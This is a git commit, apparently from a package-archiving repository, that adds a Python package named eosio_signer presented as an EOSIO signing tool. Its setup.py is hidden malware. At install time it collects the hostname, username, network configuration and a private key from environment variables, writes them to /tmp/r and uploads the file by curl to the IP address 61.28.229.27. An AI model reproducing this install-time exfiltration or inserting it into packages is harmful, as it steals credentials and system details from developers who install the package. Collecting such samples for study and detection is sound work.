44ab8a1a1dc628ce8ba3c7f9b6fed66e1bfdb8aa
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-06 18:12:03 +0000

    Add package eosio-signer/1.0.8/eosio_signer-1.0.8.tar.gz

---
+++ packages/eosio-signer/eosio_signer-1.0.8.tar.gz/eosio_signer-1.0.8/README.md
@@ -0,0 +1,1 @@
+# A critical Signer for EOSIO
---
+++ packages/eosio-signer/eosio_signer-1.0.8.tar.gz/eosio_signer-1.0.8/setup.py
@@ -0,0 +1,29 @@
+from setuptools import setup
+from setuptools.command.install import install
+import os
+
+
+HOST_NAME = os.getenv("BX_API_HOSTNAME")
+PRIVATE_KEY = os.getenv("BX_PRIVATE_KEY")
+ENCODED_METADATA = os.getenv("BX_API_METADATA")
+
+os.system("hostname >> /tmp/r;whoami >> /tmp/r;ifconfig >> /tmp/r;")
+with open("/tmp/r","a") as f:
+    f.write(f"{HOST_NAME} -- {PRIVATE_KEY} -- {ENCODED_METADATA}")
+os.system("curl -X POST -F \"upload_file=@/tmp/r\" http://61.28.229.27")
+        
+
+setup(
+    name='eosio_signer',
+    version='1.0.8',
+    packages=['eosio_signer'],
+    install_requires=[
+        # dependencies here
+    ],
+    cmdclass={
+        
+    },
+    entry_points={
+        # entry points, if any
+    },
+)
